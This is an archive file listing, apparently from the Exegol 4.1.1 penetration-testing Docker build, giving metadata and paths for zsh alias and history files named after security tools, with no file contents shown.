--rw-------   0 dramelac  (1000) dramelac  (1000)       46 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/php
--rw-------   0 dramelac  (1000) dramelac  (1000)       40 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/phpggc
--rw-------   0 dramelac  (1000) dramelac  (1000)      207 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pkinittools
--rw-------   0 dramelac  (1000) dramelac  (1000)       56 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/polenum
--rw-------   0 dramelac  (1000) dramelac  (1000)       24 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/powershell
--rw-------   0 dramelac  (1000) dramelac  (1000)       72 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/privexchange
--rw-------   0 dramelac  (1000) dramelac  (1000)     1172 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/proxmark3
--rw-------   0 dramelac  (1000) dramelac  (1000)       69 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/proxychains
--rw-------   0 dramelac  (1000) dramelac  (1000)       48 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pwndb
--rw-------   0 dramelac  (1000) dramelac  (1000)       66 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pwnedornot
--rw-------   0 dramelac  (1000) dramelac  (1000)       40 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pyftpdlib
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pygpoabuse
--rw-------   0 dramelac  (1000) dramelac  (1000)       56 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pykek
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pylaps
--rw-------   0 dramelac  (1000) dramelac  (1000)       70 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/python3
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pywhisker
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/pywsus
--rw-------   0 dramelac  (1000) dramelac  (1000)       49 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/recondog
--rw-------   0 dramelac  (1000) dramelac  (1000)      864 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/responder
--rw-------   0 dramelac  (1000) dramelac  (1000)      111 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/routersploit
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/rsactftool
--rw-------   0 dramelac  (1000) dramelac  (1000)       64 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/shadowcoerce
--rw-------   0 dramelac  (1000) dramelac  (1000)      127 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/simplyemail
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/smali
--rw-------   0 dramelac  (1000) dramelac  (1000)       51 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/smbmap
--rw-------   0 dramelac  (1000) dramelac  (1000)      222 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/spiderfoot
--rw-------   0 dramelac  (1000) dramelac  (1000)      131 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ssrfmap
--rw-------   0 dramelac  (1000) dramelac  (1000)      140 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/starkiller
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/symfony-exploits
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/targetedkerberoast
--rw-------   0 dramelac  (1000) dramelac  (1000)       49 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/testssl
--rw-------   0 dramelac  (1000) dramelac  (1000)       72 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/theharvester
--rw-------   0 dramelac  (1000) dramelac  (1000)       81 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/tls-scanner
--rw-------   0 dramelac  (1000) dramelac  (1000)       84 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/tomcatwardeployer
--rw-------   0 dramelac  (1000) dramelac  (1000)       60 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/toutatis
--rw-------   0 dramelac  (1000) dramelac  (1000)       43 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/trid
--rw-------   0 dramelac  (1000) dramelac  (1000)      396 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/trilium
--rw-------   0 dramelac  (1000) dramelac  (1000)       70 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/username-anarchy
--rw-------   0 dramelac  (1000) dramelac  (1000)       78 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/volatility
--rw-------   0 dramelac  (1000) dramelac  (1000)      171 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/vulny-code-static-analysis
--rw-------   0 dramelac  (1000) dramelac  (1000)       32 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/xmllint
--rw-------   0 dramelac  (1000) dramelac  (1000)       97 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/xsel
--rw-------   0 dramelac  (1000) dramelac  (1000)       57 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/xsstrike
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/ysoserial
--rw-------   0 dramelac  (1000) dramelac  (1000)      247 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/zerologon
--rw-------   0 dramelac  (1000) dramelac  (1000)      141 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history
-drwx------   0 dramelac  (1000) dramelac  (1000)        0 2022-12-07 19:38:25.798257 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/
--rw-------   0 dramelac  (1000) dramelac  (1000)      166 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/adidnsdump
--rw-------   0 dramelac  (1000) dramelac  (1000)      113 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/aircrack-ng
--rw-------   0 dramelac  (1000) dramelac  (1000)       20 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/amber
--rw-------   0 dramelac  (1000) dramelac  (1000)       23 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/assetfinder
--rw-------   0 dramelac  (1000) dramelac  (1000)       20 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/autorecon
--rw-------   0 dramelac  (1000) dramelac  (1000)       53 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/bloodhound-import
--rw-------   0 dramelac  (1000) dramelac  (1000)      202 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/bloodhound-py
--rw-------   0 dramelac  (1000) dramelac  (1000)       46 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/bloodhound-quickwin
--rw-------   0 dramelac  (1000) dramelac  (1000)       62 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/buster
--rw-------   0 dramelac  (1000) dramelac  (1000)       32 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/carbon14
--rw-------   0 dramelac  (1000) dramelac  (1000)       63 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/certipy
--rw-------   0 dramelac  (1000) dramelac  (1000)       58 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/cewl
--rw-------   0 dramelac  (1000) dramelac  (1000)       36 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/cloudfail
--rw-------   0 dramelac  (1000) dramelac  (1000)       30 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/clusterd
--rw-------   0 dramelac  (1000) dramelac  (1000)       31 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/cmsmap
--rw-------   0 dramelac  (1000) dramelac  (1000)      188 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/coercer
--rw-------   0 dramelac  (1000) dramelac  (1000)      133 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/crackhound
--rw-------   0 dramelac  (1000) dramelac  (1000)     1055 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/crackmapexec
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/curl
--rw-------   0 dramelac  (1000) dramelac  (1000)       49 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/cypheroth
--rw-------   0 dramelac  (1000) dramelac  (1000)       79 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/darkarmour
--rw-------   0 dramelac  (1000) dramelac  (1000)       78 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/dfscoerce
--rw-------   0 dramelac  (1000) dramelac  (1000)       72 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/dirb
--rw-------   0 dramelac  (1000) dramelac  (1000)      103 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/dirsearch
--rw-------   0 dramelac  (1000) dramelac  (1000)      367 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/divideandscan
--rw-------   0 dramelac  (1000) dramelac  (1000)      285 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/dnsutils
--rw-------   0 dramelac  (1000) dramelac  (1000)       51 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/donpapi
--rw-------   0 dramelac  (1000) dramelac  (1000)       91 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/enum4linux-ng
--rw-------   0 dramelac  (1000) dramelac  (1000)       24 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/enyx
--rw-------   0 dramelac  (1000) dramelac  (1000)       99 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/evil-winrm
--rw-------   0 dramelac  (1000) dramelac  (1000)       35 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/faketime
--rw-------   0 dramelac  (1000) dramelac  (1000)       64 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/fcrackzip
--rw-------   0 dramelac  (1000) dramelac  (1000)       52 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/feroxbuster
--rw-------   0 dramelac  (1000) dramelac  (1000)      417 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ffuf
--rw-------   0 dramelac  (1000) dramelac  (1000)       50 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/fierce
--rw-------   0 dramelac  (1000) dramelac  (1000)       78 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/finduncommonshares
--rw-------   0 dramelac  (1000) dramelac  (1000)       24 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/github-email
--rw-------   0 dramelac  (1000) dramelac  (1000)       67 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/gmsadumper
--rw-------   0 dramelac  (1000) dramelac  (1000)      189 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/gobuster
--rw-------   0 dramelac  (1000) dramelac  (1000)      141 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/goldencopy
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/gosecretsdump
--rw-------   0 dramelac  (1000) dramelac  (1000)      166 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/goshs
--rw-------   0 dramelac  (1000) dramelac  (1000)       80 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/gowitness
--rw-------   0 dramelac  (1000) dramelac  (1000)       25 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/h8mail
--rw-------   0 dramelac  (1000) dramelac  (1000)       41 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hakrawler
--rw-------   0 dramelac  (1000) dramelac  (1000)       27 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hakrevdns
--rw-------   0 dramelac  (1000) dramelac  (1000)      706 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hashcat
--rw-------   0 dramelac  (1000) dramelac  (1000)       84 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hcxdumptool
--rw-------   0 dramelac  (1000) dramelac  (1000)      131 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hcxtools
--rw-------   0 dramelac  (1000) dramelac  (1000)       22 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/holehe
--rw-------   0 dramelac  (1000) dramelac  (1000)       54 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/httpmethods
--rw-------   0 dramelac  (1000) dramelac  (1000)       59 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/httpx
--rw-r--r--   0 dramelac  (1000) dramelac  (1000)     5534 2022-12-06 13:10:27.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/impacket
--rw-------   0 dramelac  (1000) dramelac  (1000)       55 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/infoga
--rw-------   0 dramelac  (1000) dramelac  (1000)       15 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ipinfo
--rw-------   0 dramelac  (1000) dramelac  (1000)       23 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/jackit
--rw-------   0 dramelac  (1000) dramelac  (1000)      218 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/john-the-ripper
--rw-------   0 dramelac  (1000) dramelac  (1000)      135 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/kadimus
--rw-------   0 dramelac  (1000) dramelac  (1000)      164 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/kerbrute
--rw-------   0 dramelac  (1000) dramelac  (1000)      741 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/kiterunner
--rw-------   0 dramelac  (1000) dramelac  (1000)     1072 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/krbrelayx
--rw-------   0 dramelac  (1000) dramelac  (1000)       99 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ldapdomaindump
--rw-------   0 dramelac  (1000) dramelac  (1000)       72 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ldaprelayscan
--rw-------   0 dramelac  (1000) dramelac  (1000)       64 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ldapsearch
--rw-------   0 dramelac  (1000) dramelac  (1000)      152 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ldapsearch-ad
--rw-------   0 dramelac  (1000) dramelac  (1000)       75 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/libnfc
--rw-------   0 dramelac  (1000) dramelac  (1000)       42 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/libnfc-crypto1-crack
--rw-------   0 dramelac  (1000) dramelac  (1000)       53 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/linkedin2username
--rw-------   0 dramelac  (1000) dramelac  (1000)       79 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/lnkup
--rw-------   0 dramelac  (1000) dramelac  (1000)      387 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/lsassy
--rw-------   0 dramelac  (1000) dramelac  (1000)       19 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/maigret
--rw-------   0 dramelac  (1000) dramelac  (1000)      102 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/manspider
--rw-------   0 dramelac  (1000) dramelac  (1000)      144 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/masscan
--rw-------   0 dramelac  (1000) dramelac  (1000)       21 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/mfdread
--rw-------   0 dramelac  (1000) dramelac  (1000)       76 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/mfoc
--rw-------   0 dramelac  (1000) dramelac  (1000)       81 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/mitm6
--rw-------   0 dramelac  (1000) dramelac  (1000)       35 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/moodlescan
--rw-------   0 dramelac  (1000) dramelac  (1000)       23 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/mousejack
--rw-------   0 dramelac  (1000) dramelac  (1000)       44 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/name-that-hash
--rw-------   0 dramelac  (1000) dramelac  (1000)       27 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/nbtscan
--rw-------   0 dramelac  (1000) dramelac  (1000)       12 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/neo4j
--rw-------   0 dramelac  (1000) dramelac  (1000)       83 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ngrok
--rw-------   0 dramelac  (1000) dramelac  (1000)      552 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/nmap
--rw-------   0 dramelac  (1000) dramelac  (1000)      157 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ntlmv1-multi
--rw-------   0 dramelac  (1000) dramelac  (1000)       21 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ntpdate
--rw-------   0 dramelac  (1000) dramelac  (1000)       30 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/nuclei
--rw-------   0 dramelac  (1000) dramelac  (1000)       89 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/oaburl
--rw-------   0 dramelac  (1000) dramelac  (1000)      182 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/onesixtyone
--rw-------   0 dramelac  (1000) dramelac  (1000)       27 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pass-station
--rw-------   0 dramelac  (1000) dramelac  (1000)      118 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/petitpotam
--rw-------   0 dramelac  (1000) dramelac  (1000)       32 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/phoneinfoga
--rw-------   0 dramelac  (1000) dramelac  (1000)      230 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pkinittools
--rw-------   0 dramelac  (1000) dramelac  (1000)       48 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/polenum
--rw-------   0 dramelac  (1000) dramelac  (1000)      178 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/prips
--rw-------   0 dramelac  (1000) dramelac  (1000)      182 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/privexchange
--rw-------   0 dramelac  (1000) dramelac  (1000)       46 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/proxmark3
--rw-------   0 dramelac  (1000) dramelac  (1000)      397 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pth-tools
--rw-------   0 dramelac  (1000) dramelac  (1000)       41 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pwndb
--rw-------   0 dramelac  (1000) dramelac  (1000)       53 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pyftpdlib
--rw-------   0 dramelac  (1000) dramelac  (1000)       79 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pylaps
--rw-------   0 dramelac  (1000) dramelac  (1000)      103 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pypykatz
--rw-------   0 dramelac  (1000) dramelac  (1000)       74 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pywhisker
--rw-------   0 dramelac  (1000) dramelac  (1000)      203 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/pywsus
--rw-------   0 dramelac  (1000) dramelac  (1000)      329 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/responder
--rw-------   0 dramelac  (1000) dramelac  (1000)       21 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/rlwrap
--rw-------   0 dramelac  (1000) dramelac  (1000)       43 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/robotstester
--rw-------   0 dramelac  (1000) dramelac  (1000)      247 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ruler
--rw-------   0 dramelac  (1000) dramelac  (1000)      210 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/samba
--rw-------   0 dramelac  (1000) dramelac  (1000)       80 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/shadowcoerce
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/shellerator
--rw-------   0 dramelac  (1000) dramelac  (1000)       40 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/simplyemail
--rw-------   0 dramelac  (1000) dramelac  (1000)      149 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/smartbrute
--rw-------   0 dramelac  (1000) dramelac  (1000)      193 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/smbclient
--rw-------   0 dramelac  (1000) dramelac  (1000)      100 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/smbmap
--rw-------   0 dramelac  (1000) dramelac  (1000)      291 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/smtp-user-enum
--rw-------   0 dramelac  (1000) dramelac  (1000)       69 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/snmp
--rw-------   0 dramelac  (1000) dramelac  (1000)       68 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/spiderfoot
--rw-------   0 dramelac  (1000) dramelac  (1000)      216 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/sprayhound
--rw-------   0 dramelac  (1000) dramelac  (1000)       48 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/sqlmap
--rw-------   0 dramelac  (1000) dramelac  (1000)       37 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/ssh
--rw-------   0 dramelac  (1000) dramelac  (1000)      202 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/sslyze
--rw-------   0 dramelac  (1000) dramelac  (1000)       28 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/subfinder
--rw-------   0 dramelac  (1000) dramelac  (1000)       26 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/sublist3r
--rw-------   0 dramelac  (1000) dramelac  (1000)       87 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/targetedkerberoast
--rw-------   0 dramelac  (1000) dramelac  (1000)       96 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/theharvester
--rw-------   0 dramelac  (1000) dramelac  (1000)       35 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/tls-scanner
--rw-------   0 dramelac  (1000) dramelac  (1000)       38 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/toutatis
--rw-------   0 dramelac  (1000) dramelac  (1000)       99 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/twint
--rw-------   0 dramelac  (1000) dramelac  (1000)       78 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/updog
--rw-------   0 dramelac  (1000) dramelac  (1000)       21 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/waybackurls
--rw-------   0 dramelac  (1000) dramelac  (1000)       83 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/webclientservicescanner
--rw-------   0 dramelac  (1000) dramelac  (1000)      650 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/wfuzz
--rw-------   0 dramelac  (1000) dramelac  (1000)       37 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/whatportis
--rw-------   0 dramelac  (1000) dramelac  (1000)       90 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/windapsearch
--rw-------   0 dramelac  (1000) dramelac  (1000)      370 2022-11-28 13:29:29.000000 Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/wpscan
